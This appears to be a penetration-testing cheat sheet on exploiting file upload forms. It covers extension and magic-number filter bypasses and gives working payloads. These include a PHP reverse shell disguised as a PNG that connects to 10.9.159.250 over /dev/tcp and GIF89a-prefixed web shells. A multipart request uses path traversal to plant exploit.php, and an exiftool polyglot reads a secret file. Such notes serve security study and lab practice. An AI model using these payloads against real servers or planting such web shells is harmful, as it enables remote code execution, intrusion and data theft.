---
title: File upload
source_url: https://notes.incendium.rocks/pentesting-notes/web/file-upload
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---

***

Upload forms that allow to upload files are interesting to investigate.

## Steps to find vulnerable upload form

1. Find the webserver language
   1. PHP, Python, etc
2. Check for filters on the form
   1. Allowed to upload any file?
   2. Only checks file extension?
3. Bypass filter
   1. Change magic number of file using hexeditor <https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5>
   2. Change file name and add file extension (example.jpg.php)

## Examples

Bypass file extension filters:

**Add pixel to reverse shell to make it look like a image:**

```sql
echo -e $'\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo system("bash -c 'bash -i >& /dev/tcp/10.9.159.250/443 0>&1'");' > shell.png.php2
```

**GIF89a; header**

GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:

```sql
GIF89a;
<?
system($_GET['cmd']); # shellcode goes here
?>
```

## Bypass upload filters

## File upload and Path traversal

Sometimes the server is configured to prevent execution of user-supplied files. We can maybe bypass the location to upload somewhere else using path traversal:

```
-----------------------------37439413615083975161695220246
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/octet-stream

<html>
<body>
<?php system($_GET['cmd']); ?>
</body>
</html>
```

Response:

```
The file avatars/../exploit.php has been uploaded.<p>
```

Now go to the upper directory of avatars, maybe something like /files and /files/exploit.php.

## Bypass with Polyglot

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" test-412579532.png -o
polyglot.php
```
